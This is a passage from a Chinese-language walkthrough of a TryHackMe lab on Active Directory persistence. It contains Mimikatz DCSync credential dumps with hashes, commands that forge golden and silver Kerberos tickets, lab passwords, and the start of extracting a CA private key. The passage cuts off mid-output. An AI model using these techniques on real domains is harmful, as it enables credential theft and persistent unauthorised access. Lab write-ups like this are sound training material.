Account Type         : <span class="hljs-number">30000000</span> ( USER_OBJECT ) 
User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">30</span>:<span class="hljs-number">03</span> PM 
Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1120</span>
Object Relative ID   : <span class="hljs-number">1120</span>

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
    ntlm- <span class="hljs-number">0</span>: fbdcd5041c96ddbd82224270b57f11fc
    lm  - <span class="hljs-number">0</span>: d40bfd7d451f6f58d12ff18ccab7e820

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : <span class="hljs-number">474</span>acb706d53bbdb880e1dd75bc4ba8d 

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOClouis.cole 
    Default Iterations : <span class="hljs-number">4096</span>
    Credentials
      aes256_hmac       (<span class="hljs-number">4096</span>) : c069badc39ba1027c18b4833b4c25491f298a79e99eb227d44d0617b84a0b534 
      aes128_hmac       (<span class="hljs-number">4096</span>) : <span class="hljs-number">9</span>b07abcdc3c080f9d0a5cadfe2f6e244
      des_cbc_md5       (<span class="hljs-number">4096</span>) : <span class="hljs-number">408920</span>ec6426da52

* Primary:Kerberos * 
    Default Salt : ZA.TRYHACKME.LOClouis.cole
    Credentials
      des_cbc_md5       : <span class="hljs-number">408920</span>ec6426da52 

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    <span class="hljs-number">01</span>  c9ec818441c8c6df6d1d831a0c6771af
    <span class="hljs-number">02</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6
    <span class="hljs-number">03</span>  <span class="hljs-number">350</span>a3aa15bbab0697e93497f67d83114
    <span class="hljs-number">04</span>  c9ec818441c8c6df6d1d831a0c6771af 
    <span class="hljs-number">05</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6
    <span class="hljs-number">06</span>  a95cc2cd2e9193f72632108e6ff4a361
    <span class="hljs-number">07</span>  c9ec818441c8c6df6d1d831a0c6771af
	.....</code></pre>
<p>您将看到相当多的输出，包括您帐户当前的 NTLM 哈希值。您可以通过使用此类网站将您的密码转换为 NTLM 哈希来验证 NTLM 哈希是否正确。</p>
<p>这很棒，但我们希望 DC 同步每个帐户。为此，我们必须在 Mimikatz 上启用日志记录：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225173127135.png" alt="image-20240225173127135"></p>
<p>确保将<username>更改为您的用户名，以免覆盖其他用户的日志转储。现在，我们将使用 /all 标志，而不是指定我们的帐户：</username></p>
<pre><code class="hljs scss">lsadump::dcsync /domain:za.tryhackme.loc /all</code></pre>
<p>这将需要一些时间才能完成。完成后，退出 Mimikatz 以完成转储查找，然后您可以下载 _dcdump.txt 文件。您可以使用 <code>cat &lt;username&gt;_dcdump.txt | grep "SAM Username"</code> 恢复所有用户名，使用 <code>cat &lt;username&gt;_dcdump.txt | grep "Hash NTLM"</code> 恢复所有哈希值。现在，我们可以执行离线密码破解攻击来恢复纯文本凭证，或者简单地使用 Mimikatz 执行哈希传递攻击。</p>
<pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Tools/mimikatz_trunk/x64/hybcx_dcdump.txt .
    //密码:tryhackmewouldnotguess1@</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174655287.png" alt="image-20240225174655287"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174648043.png" alt="image-20240225174648043"></p>
<h1 id="0x03-通过票据持久化">0x03 通过票据持久化</h1>
<p>正如前面任务中所讨论的，我们经常希望通过具有委派权限的服务帐户来持久化伪造银票和金票。但这些到底是什么，为什么每次蓝队桌面演习结束时都会有人大喊：“冲掉所有金票和银票！”。</p>
<h2 id="巧克力工厂门票">巧克力工厂门票</h2>
<p>在讨论金票和银票之前，我们首先需要快速回顾一下 Kerberos 身份验证。下图显示了 Kerberos 身份验证的正常流程：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226163153951.png" alt="image-20240226163153951"></p>
<p>用户在 DC 上向密钥分发中心（KDC）发出 AS-REQ 请求，其中包括使用用户的 NTLM 散列加密的时间戳。本质上，这是请求一个票据授予票据（TGT）。DC 检查信息并将 TGT 发送给用户。这个 TGT 使用仅存储在 DC 上的 KRBTGT 帐户的密码哈希进行签名。现在，用户可以将这个 TGT 发送给 DC，以请求对用户想要访问的资源的票据授予服务（TGS）。如果 TGT 检查通过，DC 将响应 TGS，该 TGS 使用用户请求访问的服务的 NTLM 散列加密。然后用户将这个 TGS 提交给服务进行访问，服务可以验证 TGS，因为它知道自己的散列并可以授予用户访问权限。</p>
<p>说了所有这些背景理论后，是时候研究一下金票和银票了。</p>
<h2 id="黄金票据">黄金票据</h2>
<p>金票是伪造的 TGT。这意味着我们绕过上图中的步骤 1 和 2，向 DC 证明我们是谁。拥有特权帐户的有效 TGT，我们现在可以为几乎任何我们想要的服务请求 TGS。为了伪造金票，我们需要 KRBTGT 帐户的密码哈希，以便我们可以为我们想要的任何用户帐户签署 TGT。关于金票的一些有趣的说明：</p>
<ul>
<li>
<p>通过在 Kerberos 进程的此阶段进行注入，我们不需要要模拟的帐户的密码哈希，因为我们绕过了该步骤。 TGT仅用于证明DC上的KDC对其进行了签名。由于它是由 KRBTGT 哈希签名的，因此该验证通过，并且无论其内容如何，​​TGT 都被声明为有效。</p>
</li>
<li>
<p>说到内容，KDC 只会验证 TGT 中指定的用户帐户（如果该帐户早于 20 分钟）。这意味着我们可以将禁用、删除或不存在的帐户放入 TGT，只要我们确保时间戳不超过 20 分钟，它就有效。</p>
</li>
<li>
<p>由于票证的策略和规则是在 TGT 本身中设置的，因此我们可以覆盖 KDC 推送的值，例如票证只能在 10 小时内有效。例如，我们可以确保我们的 TGT 有效期为 10 年，从而赋予我们持久性。</p>
</li>
<li>
<p>默认情况下，KRBTGT 帐户的密码永远不会更改，这意味着一旦我们拥有密码，除非手动轮换，否则我们可以通过永久生成 TGT 来获得持久访问权限。</p>
</li>
<li>
<p>蓝队必须将 KRBTGT 帐户的密码轮换两次，因为当前密码和以前的密码对该帐户仍然有效。这是为了确保密码的意外轮换不会影响服务。</p>
</li>
<li>
<p>轮换 KRBTGT 帐户的密码对于蓝队来说是一项非常痛苦的过程，因为这将导致环境中的大量服务停止工作。他们可能认为自己拥有一个有效的 TGT，有时甚至会持续几个小时，但那个 TGT 已经失效了。并非所有的服务都足够智能，能够在 TGT 失效后释放它（因为时间戳仍然有效），因此它们不会自动请求一个新的 TGT。</p>
</li>
<li>
<p>黄金票据甚至可以让您绕过智能卡验证，因为在创建 TGT 之前，智能卡是由 DC 验证的。</p>
</li>
</ul>
<p>除了 KRBTGT 帐户的密码哈希之外，我们只需要域名、域 SID 和我们想要模拟的人的用户 ID。如果我们处于可以恢复 KRBTGT 帐户密码哈希的位置，那么我们已经处于可以恢复其他所需信息的位置了。</p>
<h2 id="白银票据">白银票据</h2>
<p>银票是伪造的 TGS 票。因此，现在，我们跳过与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），而只与我们想要直接访问的服务进行交互。关于银票的一些有趣的说明：</p>
<ul>
<li>
<p>生成的 TGS 由我们目标主机的机器帐户签名。</p>
</li>
<li>
<p>金票和银票之间的主要区别在于我们获得的特权数量。如果我们拥有 KRBTGT 帐户的密码哈希值，我们就可以访问所有内容。使用银票，由于我们只能访问我们正在攻击的服务器的计算机帐户的密码哈希，因此我们只能模拟该主机本身的用户。银票的范围仅限于特定服务器上的任何服务。</p>
</li>
<li>
<p>由于 TGS 是伪造的，所以没有关联的 TGT，这意味着 DC 从未被联系过。这使得攻击非常危险，因为唯一可用的日志将在目标服务器上。因此，虽然范围更有限，但对于蓝队来说，检测起来要困难得多。</p>
</li>
<li>
<p>由于权限是通过 SID 确定的，因此我们可以再次为银票证创建一个不存在的用户，只要我们确保该票证具有将用户置于主机的本地管理员组中的相关 SID。</p>
</li>
<li>
<p>机器帐户的密码通常每 30 天轮换一次，这不利于持久性。但是，我们可以利用 TGS 提供的访问权限来访问主机注册表并更改负责机器帐户密码轮换的参数。从而确保机器帐户保持静态并授予我们在机器上的持久性。</p>
</li>
<li>
<p>虽然只能访问单个主机可能看起来是一个显著的降级，但机器帐户可以像普通的AD帐户一样使用，不仅允许您对主机进行管理员访问，还可以继续像使用AD用户帐户一样枚举和利用AD。</p>
</li>
</ul>
<h2 id="伪造门票以获取乐趣和利润">伪造门票以获取乐趣和利润</h2>
<p>现在我们已经解释了金票和银票的基础知识，让我们生成一些。您将需要 KRBTGT 帐户的 NTLM 哈希值，由于在上一个任务中执行了 DC 同步，您现在应该拥有该哈希值。此外，记下与 THMSERVER1 计算机帐户关联的 NTLM 哈希值，因为我们需要这个哈希值作为银票。您可以在执行的 DC 转储中找到此信息。我们需要的最后一条信息是域 SID。使用 THMWRK1 上的低特权 SSH 终端，我们可以使用 AD-RSAT cmdlet 来恢复此信息：</p>
<pre><code class="hljs scss">ssh za\\phillip<span class="hljs-selector-class">.wilkins</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc &nbsp;
 //Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: phillip.wilkins <span class="hljs-attribute">Password</span>: Developmental1971</code></pre>
<p>输入以下命令获取到相关信息</p>
<pre><code class="hljs scss">PS C:\Users\phillip.wilkins&gt; Get-ADDomain 


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc       
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc 
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={<span class="hljs-number">31</span>B2F340-<span class="hljs-number">016</span>D-<span class="hljs-number">11</span>D2-<span class="hljs-number">945</span>F-<span class="hljs-number">00</span>C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : <span class="hljs-number">1</span>fc9e299-da51-<span class="hljs-number">4</span>d03-baa0-<span class="hljs-number">862</span>c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {} 
ReplicaDirectoryServers            : {THMDC<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc</code></pre>
<p>现在我们已经拥有了所有必需的信息，我们可以重新启动 Mimikatz：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164724770.png" alt="image-20240226164724770"></p>
<p>加载 Mimikatz 后，执行以下操作以生成黄金票证：</p>
<pre><code class="hljs scss">kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /krbtgt:<span class="hljs-number">16</span>f9af38fca3ada405386b3b57366082 /endin:<span class="hljs-number">600</span> /renewmax:<span class="hljs-number">10080</span> /ptt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164909614.png" alt="image-20240226164909614"></p>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/krbtgt - KRBTGT 帐户的 NTLM 哈希值。</li>
<li>/endin - 票证有效期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是10小时（600分钟）</li>
<li>/renewmax - 续订的最长票证生命周期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是7天（10080分钟）</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对域控制器运行 dir 命令来验证黄金票证是否正常工作：</p>
<pre><code class="hljs scss">dir \\thmdc<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\</code></pre>
<p>在这里我又另起了一个ssh会话，接着输入以上命令发现没有权限</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165532727.png" alt="image-20240226165532727"></p>
<p>接着我在原ssh上试了试发现成功</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165555756.png" alt="image-20240226165555756"></p>
<p>即使黄金票据的有效期非常长，蓝队仍然可以通过简单地两次轮换 KRBTGT 密码来防御。如果我们真的想深入了解，我们希望生成白银票据，这些票据不太可能被发现，并且更难以防御，因为必须轮换每个机器帐户的密码。我们可以使用以下 Mimikatz 命令来生成白银票据：</p>
<pre><code class="hljs scss">kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /target:THMSERVER1.za.tryhackme.loc /rc4:<span class="hljs-number">4</span>c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt</code></pre>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/target - 我们的目标服务器的主机名。让我们做 THMSERVER1.za.tryhackme.loc，但它可以是任何加入域的主机。</li>
<li>/rc4 - 我们的目标计算机帐户的 NTLM 哈希值。查看 DC 同步结果以查找 THMSERVER1$ 的 NTLM 哈希值。 $ 表示它是一个机器帐户。</li>
<li>/service - 我们在 TGS 中请求的服务。 CIFS 是一个安全的选择，因为它允许文件访问。</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对 THMSERVER1 运行 dir 命令来验证银票是否正常工作：</p>
<pre><code class="hljs scss">dir \\thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170201849.png" alt="image-20240226170201849"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170443201.png" alt="image-20240226170443201"></p>
<h1 id="0x04-通过证书进行持久化">0x04 通过证书进行持久化</h1>
<p><strong>这里有一个快速说明。从现在开始讨论的技术具有令人难以置信的侵入性并且难以消除。即使您已批准红队练习来执行这些技术，您在执行这些技术时也必须格外小心。在现实场景中，利用大多数这些技术将导致完整的域重建。确保您完全了解使用这些技术的后果，并且仅在您的评估事先获得批准并且认为有必要时才执行这些技术。在大多数情况下，红队演习此时将被取消，而不是使用这些技术。这意味着您很可能不会执行这些持久性技术，而是模拟它们。</strong></p>
<p>最后两种持久性技术依赖于凭据。虽然我们肯定可以让蓝队的生活变得复杂，但他们最终可以轮换足够的凭据来将我们踢出去。因此，虽然这些技术在让蓝队忙碌的同时保持着它们的忙碌很好，但我们应该寻找使用不依赖凭据的持久性技术，这意味着这些凭据的轮换不会将我们踢出去。我们将首先看看的是证书。</p>
<h2 id="ad-cs回归">AD CS回归</h2>
<p>在利用 AD 室中，我们利用证书成为域管理员。但是，证书也可用于持久性。我们所需要的只是一个可用于客户端身份验证的有效证书。这将允许我们使用证书来请求 TGT。这有什么美感？我们可以继续请求 TGT，无论他们在我们攻击的账户上进行了多少轮换。我们被踢出的唯一方法是他们撤销我们生成的证书或者证书过期。这意味着我们可能在接下来的大约 5 年里默认拥有持久访问权限。</p>
<p>如果您有兴趣了解有关请求证书并将其用于 Kerberos 身份验证的最新信息，请转到利用 AD 或 AD 证书模板室。然而，在这个房间里，我们并没有闲逛。我们正在追查证书颁发机构 (CA) 本身。</p>
<p>根据我们的访问权限，我们可以再进一步。我们可以简单地窃取根 CA 证书的私钥，以便在任何时候生成我们自己的证书。更糟糕的是，由于这些证书从未被 CA 颁发，因此蓝队无法撤销它们。对于蓝队来说，这将是更糟糕的情况，因为这意味着CA的轮换，这意味着蓝队必须撤销所有已经颁发的证书才能将我们踢出去。想象一下，你刚刚花了两天的时间执行了域接管，轮换了每个特权帐户的凭据，重置了所有的黄金和白银票据，只是为了意识到攻击者通过成为你的 CA 而持续存在。糟糕！</p>
<h2 id="提取私钥">提取私钥</h2>
<p>CA的私钥存储在CA服务器本身上。如果私钥未通过基于硬件的保护方法（例如硬件安全模块 (HSM)）进行保护（对于仅将 Active Directory 证书服务 (AD CS) 用于内部目的的组织来说通常是这种情况），则它会受到机器数据保护 API (DPAPI)。这意味着我们可以使用 Mimikatz 和 SharpDPAPI 等工具来提取 CA 证书，从而从 CA 中提取私钥。 Mimikatz 是使用最简单的工具，但如果您想体验其他工具，请看看<a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/11/15/golden-certificate/">这里</a>。使用任务 2 中的管理员凭据使用 SSH 对 THMDC.za.tryhackme.loc 进行身份验证，为您的用户创建一个唯一的目录，移至该目录并加载 Mimikatz：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172020599.png" alt="image-20240226172020599"></p>
<p>我们先看看能否查看到DC上存储的证书：</p>
<pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine 
 * System Store  : <span class="hljs-string">'local_machine'</span> (<span class="hljs-number">0</span>x00020000) 
 * Store         : <span class="hljs-string">'My'</span>

 <span class="hljs-number">0</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO

 <span class="hljs-number">1</span>. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e 
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (<span class="hljs-number">0</span>)
        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;  
        Key Container  : za-THMDC-CA
        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) 
        Exportable key : YES
        LSA isolation  : NO

 <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM 
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001) 
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c
        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
